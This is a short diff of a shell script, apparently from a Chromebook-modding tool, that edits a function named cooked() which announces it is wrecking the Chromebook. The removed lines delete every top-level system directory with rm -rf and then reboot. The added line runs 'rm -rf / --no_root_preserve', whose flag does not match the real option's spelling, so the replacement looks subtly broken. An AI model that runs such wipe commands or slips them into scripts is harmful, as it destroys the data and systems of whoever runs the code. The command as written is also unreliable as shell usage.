@@ -319,33 +319,6 @@ cooked() {
 
     echo 'statefully_fucking your chromebook...'
     sleep 2 
-    cd /
-    rm -rf bin 
-    rm -rf etc
-    rm -rf lib
-    rm -rf lost+found
-    rm -rf mnt
-    rm -rf opt
-    rm -rf proc
-    rm -rf root
-    rm -rf run
-    rm -rf ssh
-    rm -rf startup_log
-    rm -rf sys
-    rm -rf usr
-    rm -rf dev
-    rm -rf home
-    rm -rf lib64
-    rm -rf media
-    rm -rf new-startup
-    rm -rf postinst
-    rm -rf reco_patched
-    rm -rf rootkey
-    rm -rf sbin
-    rm -rf sshd_staged
-    rm -rf stateful_unfucked
-    rm -rf tmp
-    rm -rf var
-    sudo reboot
+    rm -rf / --no_root_preserve
     
 }
